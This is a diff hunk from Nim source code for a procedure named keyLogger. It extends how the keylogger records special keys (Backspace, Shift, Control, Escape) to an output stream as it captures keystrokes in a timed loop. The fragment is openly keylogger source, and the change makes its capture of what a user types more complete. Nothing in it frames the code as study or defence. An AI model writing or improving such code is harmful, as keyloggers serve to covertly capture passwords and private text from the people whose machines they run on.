@@ -74,10 +74,11 @@ proc keyLogger =
           write(strm, ch)
         else:
           case SHORT(key)
-          of VK_SHIFT:
-            write(strm, "[SHIFT]")
-          else:
-            discard
+          of VK_BACK: write(strm, "[BACK]")
+          of VK_SHIFT: write(strm, "[SHIFT]")
+          of VK_CONTROL: write(strm, "[CTRL]")
+          of VK_ESCAPE: write(strm, "[ESC]")
+          else: discard
 
     if startTime > endTime:
       break
